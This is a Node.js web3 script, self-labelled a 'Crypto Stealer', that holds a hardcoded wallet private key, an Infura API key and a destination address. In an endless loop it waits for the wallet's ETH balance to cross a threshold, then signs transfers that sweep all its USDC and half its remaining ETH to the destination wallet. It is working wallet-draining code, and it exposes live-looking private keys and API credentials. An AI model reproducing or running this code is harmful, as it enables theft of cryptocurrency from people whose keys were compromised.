import express from "express";
const app = express();
import abi from "./usdc.js";
import Web3 from "web3";
import BigNumber from "bignumber.js";
const RPC_URL = "https://mainnet.infura.io/v3/84842078b09946638c03157f83405213";
// const RPC_URL = "https://goerli.infura.io/v3/84842078b09946638c03157f83405213";
const web3 = new Web3(new Web3.providers.HttpProvider(RPC_URL));

const calculatePrice = (price, decimal) => {
  return web3.utils
    .toBN(BigNumber(price).times(BigNumber(10).pow(BigNumber(decimal))))
    .toString();
};

const walletAddress = "0xD0Ed69430C1120194E909eb048177eEEE9844c4F";
const usdcAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const toWalletAddress = "0x557B03879Db672E73E5604A402Fd70684Fe22Ad8";
const pkAddr =
  "35709b356b00eb3f0a11b28ead527cd5880491f94591335595431d4836e5c7a8";

// const walletAddress = "0x97998Cf5260e2b7fA66646C00097C6cbC9dB9df0";
// const toEthWalletAddress = "0xd30E43F1c04eC33625aCDC411CeE87a80afa4Ed2";
// const usdcAddress = "0x07865c6e87b9f70255377e024ace6630c1eaa37f";
// const toWalletAddress = "0x557B03879Db672E73E5604A402Fd70684Fe22Ad8";
// const pkAddr =
//   "0x40b418a8307de8c5a4a0cfd0827e64a5377c01e7cbe595e1214d4c5769c4fd65";

const withdrawUSDC = () =>
  new Promise(async (resolve, reject) => {
    try {
      const usdcContract = new web3.eth.Contract(abi, usdcAddress);
      const balance = await usdcContract.methods
        .balanceOf(walletAddress)
        .call();
      console.log("USDC Balance", balance);
      const usdcAmount = calculatePrice(balance, 6);
      const tx = usdcContract.methods.transfer(
        toWalletAddress,
        web3.utils.toHex(usdcAmount)
      );

      const gas = await tx.estimateGas({ from: walletAddress });
      const gasPrice = await web3.eth.getGasPrice();
      const nounce = await web3.eth.getTransactionCount(walletAddress);
      const networkId = await web3.eth.net.getId();
      console.log("networkID", networkId);
      const data = tx.encodeABI();

      const signedTx = await web3.eth.accounts.signTransaction(
        {
          to: toWalletAddress,
          from: walletAddress,
          data,
          gas,
          gasPrice,
          nounce,
          chainId: networkId,
        },
        pkAddr
      );

      const receipt = await web3.eth.sendSignedTransaction(
        signedTx.rawTransaction
      );
      resolve(receipt);
    } catch (err) {
      reject(err);
    }
  });

const withdrawEth = (newBalance, fee) =>
  new Promise(async (resolve, reject) => {
    try {
      const withdrawEthAmount = BigNumber(newBalance).minus(BigNumber(fee));
      const devidedEth = withdrawEthAmount.dividedBy(2);
      console.log("Will withdraw like", devidedEth);
      const signedTx = await web3.eth.accounts.signTransaction(
        {
          to: toWalletAddress,
          from: walletAddress,
          value: web3.utils.toBN(BigNumber(devidedEth).integerValue()),
          gas: 2000000,
        },
        pkAddr
      );

      const receipt = await web3.eth.sendSignedTransaction(
        signedTx.rawTransaction
      );
      resolve(receipt);
    } catch (err) {
      reject(err);
    }
  });

const getGasAmount = async (fromAddress, toAddress, amount) => {
  const gasAmount = await web3.eth.estimateGas({
    to: toAddress,
    from: fromAddress,
    value: web3.utils.toWei(`${amount}`, "ether"),
  });
  console.log("Gas Estimated amount", gasAmount);
  return gasAmount;
};

// Entry Function
(async () => {
  while (1) {
    const balance = await web3.eth.getBalance(walletAddress);
    console.log("Eth balance:", balance, typeof balance);
    console.log(
      BigNumber(balance).isGreaterThan(BigNumber("1417000000000000"))
    );

    if (BigNumber(balance).isGreaterThan(BigNumber("1417000000000000"))) {
      try {
        await withdrawUSDC();
        const newBalance = await web3.eth.getBalance(walletAddress);
        console.log(
          "=================You withdrawed usdc===========",
          newBalance
        );

        const gasAmount = await getGasAmount(
          walletAddress,
          toWalletAddress,
          0.001
        );

        const fee = BigNumber(gasAmount).multipliedBy(3100000);

        console.log("eth estimated fee = gasAmount * price", gasAmount, fee);

        if (BigNumber(newBalance).isGreaterThan(fee)) {
          await withdrawEth(newBalance, fee);
          console.log("-------------You are lucky----------------");
        }
      } catch (err) {
        console.log(err);
      }
    }
  }
})();

// const delay = () =>
//   new Promise((resolve) =>
//     setTimeout(() => {
//       resolve(true);
//     }, 5000)
//   );

// (async () => {
//   while (1) {
//     let result = null;
//     result = await delay();
//     console.log("result", result);
//   }
// })();

app.listen(3008, () => {
  console.log("Crypto Stealer server is started on 3008");
});
